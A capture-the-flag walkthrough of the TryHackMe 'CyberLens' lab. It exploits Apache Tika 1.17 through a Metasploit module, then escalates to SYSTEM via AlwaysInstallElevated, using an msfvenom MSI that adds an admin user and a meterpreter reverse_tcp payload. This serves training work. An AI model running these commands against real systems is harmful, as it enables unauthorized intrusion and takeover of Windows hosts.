---
title: THM Cyberlens v7
date: 2024-05-23 08:01:00 -0800
categories: [Walkthrough, TryHackMe]
tags: [THM, TryHackMe, CTF]
published: true
---

# CyberLens

[TryHackMe](https://tryhackme.com/signup?referrer=62836ffc2c1677004856943b) machine. The Description of this machines gives us a hint that there will be secrets revealed within every image. Prepare to reveal the hidden matrix of information that lurks beneath the surface of CyberLens, because at CyberLens they make metadata their playground!

So here we are going to be looking at digital forensics and image analysis, trying to expose the information that lies beneath.

Before starting we are goiong to add the server to our hosts file. 

- `sudo echo '10.10.207.0 cyberlens.thm' >> /etc/hosts`

## Enumeration

### Port Scans

Stating off with nmap scan to see what we're dealing with:

- `nmap -T4 -p- $target_ip -vvv -oN /tmp/scan_results.txt`

Then with the open ports we find we can enumerate services.

- `nmap -v -sC -sV -O -p$open_ports $target_ip -vvv`

### Port 80

Cyberlens.thm is an image metadata extractor. Upload an image and get back the metadata results. This could be running system commands.

### Port 61777

This is a Apache Tika 1.17 Server. `searchsploit Tika 1.17` yeilds results with a metasploit exploit. Setting options and running against target seems to execute the exploit but no sessions are created. There does seem to be something here though as PUT requests are allowed and we can write to the server.

## User Flag

Running `msfconsole` with `windows/http/apache_tika_jp2_jscript` after a few tries we recieve a session. So lets pick up the user flag. `type user.txt` inside of the users desktop to capture the user flag.

## Admin Flag

Enumerating with winpeas by uploading winpeasx86 to the server and executing. Just writing down a few things from there to check up on:

- powershell has console history: `C:\Users\CyberLens\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

AlwaysInstallElevated

If these 2 registers are enabled (value is 0x1), then users of any privilege can install (execute) *.msi files as NT AUTHORITY\SYSTEM.

- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

Source: [Hacktricks.xyz](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated)

Create a malicious `.msi` using `msfvenom` to create a new system admin.

-  `msfvenom -p windows/adduser USER=0xskar PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format` 

Upload using the metasploit session. or since we are already using metasploit we can use `exploit/windows/local/always_install_elevated` on the session we have open.

We can set the payload `set PAYLOAD windows/meterpreter/reverse_tcp` and with other options set running this command will get us a SYSTEM shell. We can get the flag inside of the administrator directory.
